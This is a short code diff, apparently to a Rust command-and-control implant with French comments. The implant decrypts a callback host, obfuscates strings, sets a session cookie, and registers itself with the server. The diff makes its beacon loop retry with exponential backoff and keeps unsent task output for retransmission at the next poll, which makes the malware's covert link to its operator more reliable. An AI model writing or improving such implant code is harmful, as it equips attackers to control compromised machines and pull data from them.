@@ -468,6 +468,7 @@ where
     let base = format!("https://{}", decrypted_callback);
 
     // Stage 1 : établissement du cookie de session
+    let mut retry_delay: u64 = 5;
     loop {
         if client
             .get(format!("{}{}", base, obfstr!("/js")))
@@ -479,7 +480,8 @@ where
         if should_exit() {
             return;
         }
-        sleep_with_jitter(get_sleep_seconds(), get_jitter_percent());
+        sleep(retry_delay);
+        retry_delay = (retry_delay * 2).min(60);
     }
 
     // Stage 2 : enregistrement de l'implant
@@ -558,8 +560,7 @@ where
                 }
             }
             Err(_) => {
-                prev_output = String::new();
-                prev_task_id = String::new();
+                // Ne pas reset : conserver prev_output/prev_task_id pour retransmettre au prochain poll
             }
         }
 
